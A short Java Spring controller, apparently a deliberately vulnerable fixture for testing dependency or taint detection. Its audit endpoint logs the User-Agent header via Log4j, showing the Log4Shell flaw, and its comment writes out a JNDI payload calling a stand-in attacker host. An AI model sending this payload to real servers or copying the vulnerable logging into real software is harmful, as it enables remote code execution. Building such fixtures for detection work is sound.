package com.deptex;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RestController;

/**
 * CVE-2021-44228 — "Log4Shell" RCE in log4j-core 2.0–2.14.1.
 *
 * The User-Agent header flows from the @RequestHeader-bound parameter into
 * Logger.info(), which Log4j 2.x renders with JNDI lookup substitution
 * enabled by default. A request like:
 *
 *   GET /audit
 *   User-Agent: ${jndi:ldap://attacker.example/x}
 *
 * causes Log4j to fetch + load attacker-controlled bytecode.
 */
@RestController
public class AuditController {

    private static final Logger logger = LogManager.getLogger(AuditController.class);

    @GetMapping("/audit")
    public String audit(@RequestHeader("User-Agent") String ua) {
        // Sink: tainted UA reaches Logger.info — Log4Shell.
        logger.info("client UA: " + ua);
        return "ok";
    }
}
